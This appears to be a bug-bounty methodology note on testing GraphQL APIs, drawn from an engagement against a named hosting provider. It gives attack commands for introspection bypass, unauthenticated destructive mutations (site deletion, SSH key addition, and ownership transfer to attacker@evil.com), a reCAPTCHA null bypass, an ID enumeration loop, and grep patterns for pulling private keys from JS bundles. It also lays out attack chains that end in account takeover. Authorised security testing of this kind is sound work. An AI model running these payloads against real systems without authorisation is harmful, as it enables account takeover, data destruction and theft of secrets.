# GraphQL API Security Testing — Proven Methodology

> Extracted from Kinsta bounty (2026-09-04). Systematic techniques for testing GraphQL APIs, including SPA-integrated and standalone GraphQL backends.

---

## 1. Reconnaissance: GraphQL Endpoint Discovery

### Endpoint Discovery Patterns
```bash
# Standard GraphQL paths
curl -s https://TARGET/graphql
curl -s https://TARGET/graphql/
curl -s -X POST https://TARGET/graphql -d '{"query":"{__typename}"}'
curl -s https://TARGET/api/graphql
curl -s https://TARGET/v1/graphql

# Via JS bundle analysis (SPA targets)
# Download main bundle, grep for:
grep -oE 'https?://[^"'\'' ]+graphql[^"'\'' ]*' bundle.js
grep -oP '(?:operation|query|mutation)\s*[A-Z][a-zA-Z]+' bundle.js

# Via error messages
curl -s -X POST https://TARGET/ -d '{"query":"test"}'
# GraphQL servers return: "Must provide query string" or "Syntax Error"
```

### Identify GraphQL Variant
| Response Pattern | Variant |
|-----------------|---------|
| `{"errors":[{"message":"Must provide query string"}]}` | Standard Apollo/Yoga |
| `{"error":"Must provide query"}` | Express-graphql |
| HTML + "GraphQL Playground" | Apollo Playground (introspection ON) |

---

## 2. Introspection & Schema Discovery

### Full Introspection
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name kind
      fields { name args { name type { name } } type { name kind ofType { name } } }
    }
  }
}
```

### Quick Checks
```graphql
{ __schema { mutationType { fields { name description args { name type { name } } } } } }
{ __type(name: "Mutation") { name fields { name } } }
```

### Introspection Bypass
```graphql
# If full introspection is blocked, try type-specific
{ __type(name: "User") { name fields { name type { name } } } }
{ __type(name: "Company") { name fields { name type { name } } } }
```

---

## 3. Mutation Testing Without Authentication

### Key Insight
GraphQL mutations often EXECUTE server-side logic BEFORE authorization checks. Error messages reveal execution state:

| Error Message | Meaning | Exploitability |
|--------------|---------|---------------|
| `Server Error` | Mutation EXISTS and EXECUTED | **HIGH** — code ran |
| `Permission denied` | Ran but auth check blocked | **HIGH** — auth is only barrier |
| `Not authenticated` | Requires auth | **MEDIUM** — auth bypass needed |
| `Unknown mutation` | Doesn't exist | **NONE** |

### Systematic Testing
```graphql
mutation { loginToWpAdmin(idEnvironment: "1") }
mutation { cancelPlan(idCompany: "1") }
mutation { addSshKey(idEnvironment: "1", name: "test", key: "ssh-rsa AAAA") }
mutation { updateSftpPassword(idEnvironment: "1", password: "test") }
mutation { deleteLiveSite(idEnvironment: "1") }
mutation { transferCompanyOwnership(idCompany: "1", email: "attacker@evil.com") }
mutation { editCapabilities(idCompany: "1", capabilities: ["admin"]) }
```

---

## 4. Authentication Testing

### reCAPTCHA Null Bypass
```graphql
mutation Login($email: String!, $password: String!, $recaptchaToken: String) {
  login(email: $email, password: $password, recaptchaToken: $recaptchaToken) { token }
}
# Variables: {"email":"test@test.com","password":"wrong","recaptchaToken":"null"}
# If works = reCAPTCHA NOT enforced server-side
```

### Password Reset Without Validation
```graphql
mutation { requestResetPassword(email: "admin@test.com", recaptchaToken: "null") }
# Test with 20+ emails — if ALL return same error, no email validation
```

---

## 5. ID Enumeration via Differential Errors

### The Technique
```graphql
mutation { cancelPlan(idCompany: "1") }
# "Permission denied" = ID 1 EXISTS (auth check happened)
# "Company not found" = ID 1 DOES NOT EXIST

# Sequential enumeration reveals valid vs invalid IDs
for id in $(seq 1 1000); do
  curl -s -X POST https://TARGET/graphql \
    -d "{\"query\":\"mutation { cancelPlan(idCompany: \\\"$id\\\") }\"}" \
    | jq -r '.errors[0].message'
done
# "Permission denied" for ALL = all valid, auth is only barrier
```

---

## 6. Feature Flag Enumeration

```graphql
query { flippers { id name enableForAll enableForSuperadmin } }
query { featureFlags { name enabled rolloutPercentage } }
query { config { environment debug loggingLevel } }
# Often unauthenticated — controls UI behavior
```

---

## 7. Client-Side Secret Extraction from JS Bundles

### PEM Key Extraction
```bash
curl -s https://TARGET/dist/main.bundle.js | \
  grep -oE '-----BEGIN [A-Z ]+-----[^-]+-----END [A-Z ]+-----'

# Environment variables
curl -s https://TARGET/dist/main.bundle.js | \
  grep -oE 'process\.env\.[A-Z_]+' | sort -u

# SAML/SSO patterns
curl -s https://TARGET/dist/main.bundle.js | \
  grep -oE 'SAML_[A-Z_]+|saml[A-Za-z]+Key[A-Za-z]*' | sort -u

# GraphQL operations
curl -s https://TARGET/dist/main.bundle.js | \
  grep -oP '(?:query|mutation|subscription)\s+\K[A-Za-z]+' | sort -u

# Internal/dev URLs
curl -s https://TARGET/dist/main.bundle.js | \
  grep -oE 'https?://[a-z]+-dev\.[^"'\'' ,;)]+|https?://[a-z]+-staging\.[^"'\'' ,;)]+' | sort -u
```

---

## 8. Attack Chains

### Chain 1: SAML Key Theft → Account Takeover (CRITICAL)
```
JS Bundle → Extract SAML private key → Forge SAML assertion → SSO auth → Full access
```

### Chain 2: Unauth Mutations → Data Exfiltration (HIGH-CRITICAL)
```
Introspection → Enumerate mutations → Test without auth → Server Error = executed → Extract data
```

### Chain 3: reCAPTCHA Bypass → Brute Force (HIGH)
```
null recaptchaToken → login executes → No rate limit → Credential stuffing → ATO
```

### Chain 4: Feature Flags → Targeted Attack (MEDIUM-HIGH)
```
Flippers query → Security flags exposed → Target specific features
```

---

## 9. False Positive Patterns (GraphQL-Specific)

### NOT Vulnerabilities
- GraphQL introspection enabled (many APIs intentionally expose schema)
- Error messages saying "permission denied" (authorization IS working)
- Product/category data exposed (public by design — catalog data)
- Version/build info in error messages (informational only)

### Borderline (Needs Evidence)
- All mutations accessible without auth → Must show at least one executes (Server Error)
- Feature flags enumerated → Must show flags control security-critical behavior
- Internal URLs in JS bundle → Must show URLs are accessible from internet
- reCAPTCHA bypass → Must show it works on production, not just dev

---

## 10. Severity Mapping for GraphQL

| Finding | Severity | CVSS Range |
|---------|----------|------------|
| SAML/OAuth private keys in client bundle | CRITICAL | 8.5-9.5 |
| Mutations execute without auth (data modification) | HIGH | 7.0-8.5 |
| reCAPTCHA bypass on production | HIGH | 6.5-7.5 |
| Feature flag enumeration (security flags) | HIGH | 6.0-7.0 |
| Internal infrastructure disclosure | MEDIUM-HIGH | 5.0-7.0 |
| Password reset without email validation | MEDIUM | 5.0-6.5 |
| Introspection enabled (no sensitive data) | INFO | 0.0-3.0 |

---

*Last updated: 2026-09-04 | Source: Kinsta GraphQL bounty audit*
